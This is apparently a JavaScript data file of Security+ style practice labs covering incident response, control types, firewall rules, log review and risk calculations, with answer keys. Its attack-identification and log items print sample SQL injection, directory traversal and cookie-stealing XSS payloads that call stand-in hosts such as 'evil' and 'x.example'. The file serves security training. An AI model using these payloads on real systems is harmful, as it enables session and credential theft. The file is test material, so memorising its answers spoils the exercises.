// Hands-on labs modeled on Security+ performance-based questions (PBQs).
// Types: order, match, firewall, logs, numeric.
window.SECPLUS = window.SECPLUS || {};

SECPLUS.labs = [
  // ---------- Ordering ----------
  {
    id: "ir-phases", type: "order", o: "4.8", title: "Incident response phases",
    scenario: "Your SOC just detected ransomware on a file server. Put the incident response phases in the order they should occur.",
    items: ["Preparation", "Detection", "Analysis", "Containment", "Eradication", "Recovery", "Lessons learned"],
    explain: "Preparation happens before the incident. Detect and analyze it, then contain it to stop the spread, eradicate the root cause, recover systems to normal, and finish with a lessons-learned review."
  },
  {
    id: "volatility", type: "order", o: "4.8", title: "Order of volatility",
    scenario: "You are collecting evidence from a compromised, still-running server. Order the sources from MOST volatile (collect first) to LEAST volatile.",
    items: ["CPU registers and cache", "RAM (system memory)", "Swap / page file and temporary files", "Local disk", "Remote logs and monitoring data", "Archived backups and media"],
    explain: "Collect the evidence that disappears fastest first. Registers and cache change constantly, RAM is lost at power-off, and swap and temp files change as the system runs. Disks, remote logs and archives last much longer."
  },
  {
    id: "change-mgmt", type: "order", o: "1.3", title: "Change management workflow",
    scenario: "A network engineer needs to upgrade the core firewall firmware. Arrange the change management steps in the correct order.",
    items: ["Submit a change request", "Perform an impact analysis", "Obtain CAB approval", "Test the change in a staging environment", "Implement during the maintenance window", "Verify the change and update documentation"],
    explain: "Changes are requested, analyzed for impact, approved by the change advisory board, tested, implemented in an approved window (with a backout plan ready), then verified and documented."
  },
  {
    id: "vuln-lifecycle", type: "order", o: "4.3", title: "Vulnerability management lifecycle",
    scenario: "Order the steps of the vulnerability management process for a newly scanned network segment.",
    items: ["Identify vulnerabilities (scan, threat feeds)", "Analyze and confirm (rule out false positives)", "Prioritize using CVSS and environmental context", "Remediate (patch, compensating controls, or exception)", "Validate by rescanning", "Report results"],
    explain: "Identification is followed by analysis and confirmation, risk-based prioritization, remediation, validation (rescan/audit) and reporting."
  },
  {
    id: "cert-issue", type: "order", o: "1.4", title: "Obtaining a TLS certificate",
    scenario: "You need a publicly trusted TLS certificate for shop.example.com. Put the steps in order.",
    items: ["Generate a public/private key pair on the server", "Create a CSR containing the public key and subject details", "Submit the CSR to a certificate authority", "The CA validates domain ownership/identity", "The CA signs and issues the certificate", "Install the certificate (and chain) on the web server"],
    explain: "The private key never leaves the server. The CSR carries the public key to the CA, which validates you, signs the certificate, and you install it with the intermediate chain."
  },

  // ---------- Matching / categorizing ----------
  {
    id: "control-types", type: "match", o: "1.1", title: "Classify the control type",
    scenario: "For each control, select its PRIMARY control type.",
    categories: ["Preventive", "Deterrent", "Detective", "Corrective", "Compensating", "Directive"],
    items: [
      ["Door lock on the server room", "Preventive"],
      ["'Trespassers will be prosecuted' sign", "Deterrent"],
      ["Reviewing firewall logs each morning", "Detective"],
      ["Restoring a database from backup after corruption", "Corrective"],
      ["Isolating an unpatchable legacy system on its own VLAN", "Compensating"],
      ["Acceptable use policy employees must follow", "Directive"],
      ["Motion-activated alarm", "Detective"],
      ["Re-imaging an infected workstation", "Corrective"]
    ],
    explain: "Preventive controls stop an incident and deterrent controls discourage one. Detective controls spot it, corrective controls fix things afterward, and compensating controls substitute when the primary control isn't possible. Directive controls instruct behavior."
  },
  {
    id: "control-categories", type: "match", o: "1.1", title: "Classify the control category",
    scenario: "Select the category for each security control.",
    categories: ["Technical", "Managerial", "Operational", "Physical"],
    items: [
      ["Next-generation firewall", "Technical"],
      ["Annual risk assessment", "Managerial"],
      ["Security guard at the lobby desk", "Operational"],
      ["Bollards in front of the entrance", "Physical"],
      ["Full-disk encryption on laptops", "Technical"],
      ["Security awareness training sessions", "Operational"],
      ["Information security policy", "Managerial"],
      ["Fence around the data center", "Physical"]
    ],
    explain: "Technical controls are enforced by technology. Managerial controls are policies and risk management. Operational controls are carried out by people, and physical controls are tangible barriers."
  },
  {
    id: "identify-attacks", type: "match", o: "2.4", title: "Identify the attack",
    scenario: "Match each observation from your investigation to the attack it indicates.",
    categories: ["SQL injection", "Cross-site scripting", "Directory traversal", "Password spraying", "On-path attack", "DNS poisoning", "Buffer overflow", "Ransomware"],
    items: [
      ["Login field input: admin' OR '1'='1' --", "SQL injection"],
      ["Request: /view?file=../../../../etc/shadow", "Directory traversal"],
      ["Comment field contains <script>document.location='http://evil/?c='+document.cookie</script>", "Cross-site scripting"],
      ["'Spring2026!' tried once against 3,000 accounts", "Password spraying"],
      ["ARP table shows the gateway IP mapped to an unknown workstation's MAC", "On-path attack"],
      ["Users resolving bank.com are sent to an attacker IP by the internal resolver", "DNS poisoning"],
      ["Service crashes after receiving a 10,000-character username, then spawns a shell", "Buffer overflow"],
      ["Files renamed to *.crypt with a README demanding Bitcoin", "Ransomware"]
    ],
    explain: "Look for the telltale artifact. Quotes and SQL keywords point to SQLi, ../ to traversal and <script> to XSS. One password against many accounts is spraying, and a spoofed ARP entry means an on-path attack. A poisoned resolver cache is DNS poisoning, an oversized input followed by code execution is a buffer overflow, and encrypted files with a ransom note are ransomware."
  },
  {
    id: "social-eng", type: "match", o: "2.2", title: "Social engineering techniques",
    scenario: "Identify the social engineering technique in each scenario.",
    categories: ["Phishing", "Spear phishing", "Whaling", "Vishing", "Smishing", "Pretexting", "Watering hole", "Typosquatting"],
    items: [
      ["Generic email to thousands: 'Your mailbox is full, log in here'", "Phishing"],
      ["Email to the payroll team referencing their manager by name and a real project", "Spear phishing"],
      ["Fake legal subpoena emailed only to the CEO", "Whaling"],
      ["Phone call from 'IT support' asking for your password", "Vishing"],
      ["Text message: 'Your package is held, pay $1.99 here'", "Smishing"],
      ["Caller claims to be a new auditor and invents a detailed story to obtain the org chart", "Pretexting"],
      ["Industry news site frequented by targets is compromised to serve malware", "Watering hole"],
      ["Attacker registers paypa1.com", "Typosquatting"]
    ],
    explain: "Phishing is broad, spear phishing is targeted and whaling targets executives. Vishing uses voice and smishing uses SMS. Pretexting relies on a fabricated story, a watering hole compromises a site the targets visit, and typosquatting uses look-alike domains."
  },
  {
    id: "secure-protocols", type: "match", o: "4.5", title: "Replace insecure protocols",
    scenario: "An audit found insecure protocols on the network. Select the secure replacement for each.",
    categories: ["SSH", "SFTP", "HTTPS", "LDAPS", "SNMPv3", "IMAPS", "DNSSEC", "SRTP"],
    items: [
      ["Telnet (23)", "SSH"],
      ["FTP (20/21)", "SFTP"],
      ["HTTP (80)", "HTTPS"],
      ["LDAP (389)", "LDAPS"],
      ["SNMPv1/v2c (161)", "SNMPv3"],
      ["IMAP (143)", "IMAPS"],
      ["DNS without integrity protection", "DNSSEC"],
      ["RTP voice traffic", "SRTP"]
    ],
    explain: "Prefer encrypted or authenticated versions: SSH (22), SFTP (22), HTTPS (443), LDAPS (636), SNMPv3, IMAPS (993), DNSSEC for signed DNS records, and SRTP for encrypted VoIP media."
  },
  {
    id: "placement", type: "match", o: "3.2", title: "Network device placement",
    scenario: "Your company has three zones: a screened subnet (DMZ) for public services, the internal network, and an isolated management network. Place each system in the correct zone.",
    categories: ["Screened subnet (DMZ)", "Internal network", "Management network"],
    items: [
      ["Public company website", "Screened subnet (DMZ)"],
      ["Inbound email gateway / relay", "Screened subnet (DMZ)"],
      ["Public-facing DNS server", "Screened subnet (DMZ)"],
      ["HR database server", "Internal network"],
      ["Active Directory domain controller", "Internal network"],
      ["Employee file server", "Internal network"],
      ["Switch and router management interfaces", "Management network"],
      ["Jump server used by admins to manage infrastructure", "Management network"]
    ],
    explain: "Anything reachable from the internet belongs in the DMZ. Sensitive internal services stay on the internal network. Device management interfaces and the jump server are isolated on a management network."
  },
  {
    id: "access-models", type: "match", o: "4.6", title: "Access control models",
    scenario: "Identify the access control model described in each scenario.",
    categories: ["Mandatory (MAC)", "Discretionary (DAC)", "Role-based (RBAC)", "Rule-based", "Attribute-based (ABAC)"],
    items: [
      ["Documents labeled Secret can only be read by users with Secret clearance or higher", "Mandatory (MAC)"],
      ["The creator of a spreadsheet decides who can edit it", "Discretionary (DAC)"],
      ["All members of the 'Accounts Payable' group can approve invoices", "Role-based (RBAC)"],
      ["The VPN denies all logins between midnight and 5 a.m.", "Rule-based"],
      ["Access is allowed if department=Finance AND device=managed AND location=US", "Attribute-based (ABAC)"],
      ["A firewall ACL permits only TCP 443 to the web server", "Rule-based"]
    ],
    explain: "MAC uses labels set by the system. DAC lets the owner decide and RBAC uses job roles. Rule-based applies global rules such as time or ACLs, and ABAC evaluates multiple attributes."
  },
  {
    id: "shared-resp", type: "match", o: "3.1", title: "Shared responsibility (IaaS)",
    scenario: "Your company runs virtual machines on an IaaS cloud platform. For each task, who is responsible?",
    categories: ["Cloud provider", "Customer"],
    items: [
      ["Physical security of the data center", "Cloud provider"],
      ["Patching the hypervisor", "Cloud provider"],
      ["Patching the guest operating system", "Customer"],
      ["Configuring security groups / VM firewall rules", "Customer"],
      ["Replacing failed physical disks", "Cloud provider"],
      ["Managing IAM user accounts and MFA", "Customer"],
      ["Classifying and encrypting the data stored in VMs", "Customer"],
      ["Securing the physical network between data centers", "Cloud provider"]
    ],
    explain: "In IaaS the provider secures the cloud itself: facilities, hardware, network and hypervisor. The customer secures what they put in it: the OS, applications, configurations, identities and data."
  },
  {
    id: "risk-strategies", type: "match", o: "5.2", title: "Risk response strategies",
    scenario: "Identify the risk strategy used in each case.",
    categories: ["Mitigate", "Transfer", "Accept", "Avoid"],
    items: [
      ["Buying cyber insurance to cover breach costs", "Transfer"],
      ["Deploying MFA to reduce account takeover", "Mitigate"],
      ["Discontinuing an insecure legacy product line", "Avoid"],
      ["Documenting an exception for a low-impact risk where the fix costs more than the loss", "Accept"],
      ["Outsourcing payment processing to a PCI-compliant provider by contract", "Transfer"],
      ["Installing a WAF in front of the web application", "Mitigate"]
    ],
    explain: "Mitigation reduces likelihood or impact, and transfer shifts the impact to a third party. Acceptance acknowledges the risk without acting, and avoidance stops the risky activity altogether."
  },
  {
    id: "agreements", type: "match", o: "5.3", title: "Vendor agreements",
    scenario: "Match each description to the correct agreement type.",
    categories: ["SLA", "MOU", "MSA", "SOW", "NDA", "BPA"],
    items: [
      ["Guarantees 99.95% uptime and defines service credits if missed", "SLA"],
      ["Non-binding statement of intent to cooperate between two organizations", "MOU"],
      ["Umbrella contract with general terms for all future projects", "MSA"],
      ["Defines deliverables, timeline, and scope of a specific project", "SOW"],
      ["Legally binds a contractor to keep company information confidential", "NDA"],
      ["Defines how two partners share profits, losses, and responsibilities", "BPA"]
    ],
    explain: "An SLA sets service levels, an MOU expresses intent, an MSA holds the master terms and an SOW covers project specifics. An NDA protects confidentiality and a BPA governs a partnership."
  },
  {
    id: "data-roles", type: "match", o: "5.1", title: "Data roles",
    scenario: "A retailer collects customer data and uses a cloud marketing firm to send emails. Identify each role.",
    categories: ["Data owner", "Data controller", "Data processor", "Data custodian", "Data subject"],
    items: [
      ["A customer whose purchase history is stored", "Data subject"],
      ["The retailer, which decides why and how customer data is used", "Data controller"],
      ["The marketing firm sending emails on the retailer's instructions", "Data processor"],
      ["The VP of Sales, accountable for the customer database", "Data owner"],
      ["The DBA who manages backups and applies permissions", "Data custodian"]
    ],
    explain: "The controller decides purpose and means, and the processor acts on its behalf. The owner is the accountable executive, the custodian handles day-to-day protection, and the subject is the person the data is about."
  },
  {
    id: "data-states", type: "match", o: "3.3", title: "Data states & protections",
    scenario: "Identify the data state in each situation.",
    categories: ["Data at rest", "Data in transit", "Data in use"],
    items: [
      ["Customer records stored on a SAN", "Data at rest"],
      ["A file being uploaded over HTTPS", "Data in transit"],
      ["A spreadsheet open and being edited in memory", "Data in use"],
      ["Backups on tape in an offsite vault", "Data at rest"],
      ["Email traveling between mail servers over TLS", "Data in transit"],
      ["Credit card number being processed by the CPU in a secure enclave", "Data in use"]
    ],
    explain: "Data at rest is stored (protect it with disk, file or database encryption). Data in transit moves over a network (TLS, IPsec). Data in use is being processed (secure enclaves, memory protections)."
  },

  // ---------- Firewall rule builders ----------
  {
    id: "fw-dmz", type: "firewall", o: "4.5", title: "Secure the DMZ web server",
    scenario: "The current rule set allows everything. Rewrite it to meet these requirements:\n• Anyone on the Internet can reach the Web server over HTTPS only.\n• The Web server can query the Database server on TCP 1433.\n• Only the Admin workstation can SSH to the Web server.\n• Everything else must be blocked. Rules are processed top-down, and there is an implicit deny at the end.",
    hosts: ["Internet", "Web server", "Database server", "Admin workstation", "Internal LAN"],
    groups: {},
    ports: ["22", "80", "443", "1433", "3389"],
    start: [["ALLOW", "ANY", "ANY", "ANY", "ANY"]],
    tests: [
      ["Internet", "Web server", "TCP", "443", "ALLOW"],
      ["Internet", "Web server", "TCP", "80", "DENY"],
      ["Internet", "Database server", "TCP", "1433", "DENY"],
      ["Web server", "Database server", "TCP", "1433", "ALLOW"],
      ["Admin workstation", "Web server", "TCP", "22", "ALLOW"],
      ["Internal LAN", "Web server", "TCP", "22", "DENY"],
      ["Internet", "Web server", "TCP", "22", "DENY"],
      ["Internal LAN", "Database server", "TCP", "3389", "DENY"]
    ],
    explain: "One working solution:\n1. ALLOW Internet → Web server TCP 443\n2. ALLOW Web server → Database server TCP 1433\n3. ALLOW Admin workstation → Web server TCP 22\nThe implicit deny blocks everything else. The original ALLOW ANY rule must be removed."
  },
  {
    id: "fw-order", type: "firewall", o: "3.2", title: "Fix the rule order",
    scenario: "Threat intel reports that 203.0.113.66 is attacking your mail server. The firewall already has a rule to block it, but the attack is still getting through.\nRequirements:\n• Block the Malicious IP from reaching anything.\n• The rest of the Internet can still deliver mail to the Mail server on TCP 25.\n• Internal users can browse the web (TCP 443) and use DNS (UDP 53) to the Internet.\nNote: the 'Internet' source also includes the Malicious IP.",
    hosts: ["Internet", "Malicious IP", "Mail server", "Internal users"],
    groups: { "Internet": ["Internet", "Malicious IP"] },
    ports: ["25", "53", "443"],
    start: [
      ["ALLOW", "Internet", "Mail server", "TCP", "25"],
      ["DENY", "Malicious IP", "ANY", "ANY", "ANY"],
      ["ALLOW", "Internal users", "Internet", "TCP", "443"]
    ],
    tests: [
      ["Malicious IP", "Mail server", "TCP", "25", "DENY"],
      ["Internet", "Mail server", "TCP", "25", "ALLOW"],
      ["Internal users", "Internet", "TCP", "443", "ALLOW"],
      ["Internal users", "Internet", "UDP", "53", "ALLOW"],
      ["Internet", "Internal users", "TCP", "443", "DENY"],
      ["Malicious IP", "Internal users", "TCP", "443", "DENY"]
    ],
    explain: "The DENY for the Malicious IP must sit ABOVE the broader ALLOW Internet rule, because the first matching rule wins. Then add ALLOW Internal users → Internet UDP 53 for DNS."
  },

  // ---------- Log analysis ----------
  {
    id: "log-spray", type: "logs", o: "2.4", title: "Authentication log review",
    scenario: "Review this authentication log from the VPN gateway. Select every line that is part of the attack, then answer the question.",
    lines: [
      "08:01:12 SUCCESS user=jsmith src=198.51.100.23",
      "08:14:02 FAIL    user=adavis   src=45.155.204.17 reason=bad_password",
      "08:14:03 FAIL    user=bchen    src=45.155.204.17 reason=bad_password",
      "08:14:03 FAIL    user=cmorris  src=45.155.204.17 reason=bad_password",
      "08:14:04 FAIL    user=dlopez   src=45.155.204.17 reason=bad_password",
      "08:15:40 FAIL    user=mjones   src=198.51.100.88 reason=bad_password",
      "08:15:52 SUCCESS user=mjones   src=198.51.100.88",
      "08:16:11 SUCCESS user=epatel   src=45.155.204.17",
      "08:16:12 FAIL    user=fwong    src=45.155.204.17 reason=bad_password"
    ],
    bad: [1, 2, 3, 4, 7, 8],
    question: {
      q: "What attack is MOST likely taking place?",
      c: ["Password spraying", "Brute force against one account", "Credential replay", "Impossible travel"],
      a: 0,
      e: "One source IP tries a password once against many different accounts in seconds, which is password spraying. Note the SUCCESS for epatel from the same IP: that account is now compromised. mjones simply mistyped once from a normal address."
    }
  },
  {
    id: "log-web", type: "logs", o: "2.4", title: "Web server access log",
    scenario: "Your WAF was in monitor-only mode. Select every malicious request in this web access log, then identify the attacks.",
    lines: [
      "203.0.113.5 \"GET /index.html HTTP/1.1\" 200",
      "203.0.113.5 \"GET /products?id=42 HTTP/1.1\" 200",
      "192.0.2.77 \"GET /products?id=42' UNION SELECT username,password FROM users-- HTTP/1.1\" 200",
      "203.0.113.9 \"POST /login HTTP/1.1\" 302",
      "192.0.2.77 \"GET /download?file=../../../../etc/passwd HTTP/1.1\" 200",
      "198.51.100.4 \"GET /images/logo.png HTTP/1.1\" 200",
      "192.0.2.77 \"GET /search?q=<script>new Image().src='//x.example/c?'+document.cookie</script> HTTP/1.1\" 200",
      "203.0.113.9 \"GET /account HTTP/1.1\" 200"
    ],
    bad: [2, 4, 6],
    question: {
      q: "Which THREE attacks did 192.0.2.77 attempt? (Choose three.)",
      c: ["SQL injection", "Directory traversal", "Cross-site scripting", "CSRF", "Buffer overflow"],
      a: [0, 1, 2],
      e: "UNION SELECT is SQL injection, ../../ is directory traversal, and the <script> payload stealing cookies is reflected XSS. All three returned HTTP 200, so the attacks may have succeeded."
    }
  },
  {
    id: "log-scan", type: "logs", o: "4.9", title: "Firewall log analysis",
    scenario: "Review these perimeter firewall logs. Select the lines that show suspicious activity, then identify it.",
    lines: [
      "10:02:01 ALLOW TCP 10.0.5.20:51544 -> 142.250.72.14:443",
      "10:02:15 DENY  TCP 185.220.101.4:40001 -> 203.0.113.10:21",
      "10:02:15 DENY  TCP 185.220.101.4:40002 -> 203.0.113.10:22",
      "10:02:15 DENY  TCP 185.220.101.4:40003 -> 203.0.113.10:23",
      "10:02:16 DENY  TCP 185.220.101.4:40004 -> 203.0.113.10:25",
      "10:02:16 ALLOW TCP 185.220.101.4:40005 -> 203.0.113.10:443",
      "10:02:16 DENY  TCP 185.220.101.4:40006 -> 203.0.113.10:3389",
      "10:03:40 ALLOW UDP 10.0.5.31:53211 -> 8.8.8.8:53"
    ],
    bad: [1, 2, 3, 4, 5, 6],
    question: {
      q: "What activity do the selected lines show?",
      c: ["A port scan (active reconnaissance)", "A DDoS attack", "Data exfiltration", "Normal user browsing"],
      a: 0,
      e: "One external IP probes many well-known ports on the same host within seconds, using sequential source ports. That is a port scan. Port 443 was allowed because the web server is meant to be public."
    }
  },
  {
    id: "log-travel", type: "logs", o: "2.4", title: "Cloud sign-in logs",
    scenario: "Review these cloud identity sign-in logs for the user kpatel. Select the suspicious events, then decide on the indicator.",
    lines: [
      "2026-10-19 07:55 UTC kpatel SUCCESS MFA  Chicago, US     device=managed-laptop",
      "2026-10-19 09:10 UTC kpatel SUCCESS MFA  Chicago, US     device=managed-laptop",
      "2026-10-19 09:42 UTC kpatel SUCCESS none Lagos, NG       device=unknown legacy_auth=IMAP",
      "2026-10-19 09:44 UTC kpatel MAILBOX_RULE_CREATED forward_all -> ext-archive@proton.example",
      "2026-10-19 12:30 UTC kpatel SUCCESS MFA  Chicago, US     device=managed-laptop"
    ],
    bad: [2, 3],
    question: {
      q: "Which indicator BEST describes the 09:42 sign-in, and what is the most important next step?",
      c: ["Impossible travel — reset credentials, revoke sessions, remove the forwarding rule, and block legacy authentication", "Concurrent session usage — no action needed", "Account lockout — unlock the account", "Out-of-cycle logging — increase log retention"],
      a: 0,
      e: "Chicago to Lagos in 32 minutes is impossible travel. The attacker used legacy IMAP auth to bypass MFA, then created a forwarding rule to exfiltrate mail, which is a common BEC pattern."
    }
  },

  // ---------- Calculations ----------
  {
    id: "calc-ale", type: "numeric", o: "5.2", title: "Quantitative risk analysis",
    scenario: "A customer database server is valued at $120,000. A successful breach would cause a 30% loss of its value. Breaches of this type are expected once every 2 years.\nA proposed DLP control costs $10,000 per year and would reduce the expected frequency to once every 10 years.",
    fields: [
      { label: "Single Loss Expectancy (SLE) in $", answer: 36000 },
      { label: "Annualized Rate of Occurrence (ARO)", answer: 0.5 },
      { label: "Annualized Loss Expectancy (ALE) in $", answer: 18000 },
      { label: "New ALE with the control in $", answer: 3600 },
      { label: "Annual net value of the control in $ (ALE before − ALE after − cost)", answer: 4400 }
    ],
    explain: "SLE = AV × EF = 120,000 × 0.30 = $36,000. ARO = 1/2 = 0.5. ALE = 36,000 × 0.5 = $18,000. With the control, ARO = 0.1, so ALE = $3,600. Value = 18,000 − 3,600 − 10,000 = $4,400 per year, so the control is cost-justified."
  },
  {
    id: "calc-laptops", type: "numeric", o: "5.2", title: "Laptop theft risk",
    scenario: "Your company has 2,000 laptops, each worth $1,500 (a stolen laptop is a 100% loss). Historically, 1% of laptops are stolen each year.",
    fields: [
      { label: "SLE for one laptop in $", answer: 1500 },
      { label: "ARO (laptops stolen per year)", answer: 20 },
      { label: "ALE in $", answer: 30000 }
    ],
    explain: "SLE = $1,500 × 100% = $1,500. ARO = 2,000 × 1% = 20 per year. ALE = 1,500 × 20 = $30,000. Full-disk encryption won't reduce this hardware loss, but it prevents the much larger cost of a data breach."
  },
  {
    id: "calc-backups", type: "numeric", o: "3.4", title: "Backup restore planning",
    scenario: "A server gets a full backup every Sunday night and a backup every Monday through Saturday night. It fails on Thursday at 10 a.m., after Wednesday night's backup completed.",
    fields: [
      { label: "If the daily backups are INCREMENTAL, how many backup sets must be restored?", answer: 4 },
      { label: "If the daily backups are DIFFERENTIAL, how many backup sets must be restored?", answer: 2 },
      { label: "Roughly how many hours of data are lost (Wednesday 11 p.m. backup to the 10 a.m. failure)?", answer: 11 }
    ],
    explain: "With incrementals you need Sunday's full plus Monday, Tuesday and Wednesday (4 sets). With differentials you need the full plus Wednesday's differential (2 sets). About 11 hours of data are lost, so a daily backup gives an RPO of up to 24 hours."
  }
];
